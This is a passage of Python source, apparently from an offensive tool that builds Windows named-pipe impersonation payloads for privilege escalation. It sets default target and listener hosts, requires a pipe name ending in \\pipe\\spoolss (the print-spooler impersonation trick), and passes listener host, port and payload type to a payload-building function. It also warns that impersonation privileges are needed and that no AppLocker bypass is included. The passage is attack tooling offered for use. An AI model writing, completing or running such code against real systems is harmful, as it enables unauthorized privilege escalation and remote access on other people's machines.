    jitcompile = args.justintime

    jitcompile = "0" if jitcompile == None else "1"
    if targethost == None: targethost = "[TARGETHOST]"
    if listenhost == None: listenhost = "[LISTENHOST]"
    if binary == None: binary = "0" #if 0, call run.txt by default 
    if pipename == None: pipename = "0"

    if pipename != "0":
        if "\\pipe\\spoolss" not in pipename:
            print("[!] pipename must end with \\pipe\\spoolss! e.g. \\\\.\\pipe\\test\\pipe\\spoolss ! terminating!")
            sys.exit()

    if pipename == "0":
        pipename = "\\\\.\\pipe\\test\\pipe\\spoolss"
        print('[!] default pipename used: %s' % pipename)

    #writepipepipe(bitness,lhost,lport,ptype,binary,pipename,targethost,listenhost,jitcompile)
    print('[!] warning! run only with impersonation privileges!')
    print('[!] warning! no applocker bypass techniques included!\n')
    makepipepipe(bitness,lhost,lport,ptype,binary,pipename,targethost,listenhost,jitcompile)
